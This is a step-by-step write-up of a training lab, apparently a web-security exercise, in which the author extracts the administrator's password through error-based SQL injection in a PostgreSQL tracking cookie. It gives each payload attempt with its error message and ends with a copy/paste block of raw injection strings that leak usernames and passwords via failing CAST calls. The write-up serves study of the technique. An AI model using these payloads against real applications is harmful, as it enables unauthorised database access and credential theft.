# Visible error-based SQL injection

*A clean, step‑by‑step write‑up using my original flow and raw payloads (no URL‑encoding), with tiny typo fixes and minimal notes.*

---

## 🎯 Goal
**Get creds and log in as the `administrator`.**

---

## 🔎 Discovery & Signal
- Vulnerable **parameter**: the cookie value appended into a SQL string.
- DB behavior / errors clearly look like **PostgreSQL** (e.g., *“operator does not exist…”, “LIMIT #,# syntax is not supported”*).

---

## ✅ My Exact Steps (verbatim, lightly corrected)

1. **GOAL:** Get creds, and log in as the administrator.  
2. **Finding vulnerable parameter:** cookie → `aaa'`  
3. **Error shown:** *Unterminated string literal started at position 39 in*  
   `SQL SELECT * FROM tracking WHERE id = 'aaa''`. *Expected '*`'`* **char**  
4. **Attempted fix via concatenation:** `aaa'||(SELECT 1)||'` → **fixed** (no error).  
5. **Try selecting from users:** `aaa'||(SELECT 1 FROM users)||'` → **error**  
6. **Error:** *more than one row returned by a subquery used as an expression*  
7. **Use that to our advantage (force single row):**  
   `aaaaaaa'||(SELECT 1 FROM users WHERE username='administrator')||'` → **no error**  
8. Change username → `administratorr` → **error**  
9. Change username → `administrato` → **no error**  
10. **Hypothesis:** the injected value is **length‑limited**, so need a different approach.  
11. **Tried boolean via AND (didn’t work here):**  
    `' + AND (SELECT 1 FROM users WHERE username='administrator')=1 --`  
12. **Tried grabbing a row directly (type mismatch error is useful):**  
    `' AND 1=(SELECT username FROM users limit 1) --` → **Error**: *operator does not exist: integer = character varying*  
13. **Tried casting (syntax reminder moment 😅):**  
    `' AND 1=(SELECT CAST(username FROM users limit 1)) --` → **syntax issue**  
14. **Then:** `' AND 1=CAST((SELECT username FROM users limit 1)) --` → **still wrong**  
15. **Finally:** `' AND 1=CAST((SELECT username FROM users limit 1) AS int) --` → **new error**  
16. **Error now leaks data context:** *invalid input syntax for type integer: "administrator"* ✅  
17. Tried MySQL‑style paging: `limit 2,1` → **Error**: *LIMIT #,# syntax is not supported* → use **LIMIT 1 OFFSET 1** in Postgres.  
18. We likely already have the **first user = administrator**, so pivot to **password**:  
    `' AND 1=CAST((SELECT password FROM users limit 1) AS int) --`  
19. **Error leaks password value** (e.g., *invalid input syntax for type integer: "zbup7e5fmnt72w5rhfqv"*).  
20. **Use leaked password** → log in as **administrator**.  
21. **Lab solved.** ✅

---

## 🧠 Why This Works (minimal notes)
- **PostgreSQL error‑based extraction:** Forcing a **failing CAST** (`CAST(<text> AS int)`) makes Postgres include the **offending string** in the error message → you read the secret in the error.  
- **Single‑row scalar subquery:** In string concatenation context (`'||(SELECT …)||'`), the subquery **must return 1 row**; otherwise you get *“more than one row…”*. Narrow with `WHERE …`, or use `LIMIT 1` (and `OFFSET` as needed).  
- **Paging syntax:** Postgres uses `LIMIT <n> OFFSET <m>` (not `LIMIT m,n`).  
- **Type mismatch hints:** The *“operator does not exist: integer = character varying”* error comes from comparing `1` (int) to a `text` — which is useful to pivot to casting attacks.  
- **Concatenation operator:** Postgres uses `||` for string concatenation (same as Oracle).  

> Tip: For multi‑row tables, you can iterate passwords with `LIMIT 1 OFFSET i` to walk rows; for multi‑char fields, you can switch to boolean or error‑based **per‑character** tests (e.g., `substring(password, i, 1)`) if needed.

---

## ⌨️ Raw Payloads (copy/paste — exactly as used)
```text
aaa'
aaa'||(SELECT 1)||'
aaa'||(SELECT 1 FROM users)||'
aaaaaaa'||(SELECT 1 FROM users WHERE username='administrator')||'
' + AND (SELECT 1 FROM users WHERE username='administrator')=1 --
' AND 1=(SELECT username FROM users limit 1) --
' AND 1=(SELECT CAST(username FROM users limit 1)) --
' AND 1=CAST((SELECT username FROM users limit 1)) --
' AND 1=CAST((SELECT username FROM users limit 1) AS int) --
' AND 1=CAST((SELECT password FROM users limit 1) AS int) --
```

---

## 🏁 Result
- Used Postgres **error messages** to reveal data (username/password), then authenticated as **administrator**. **Solved. ✅**
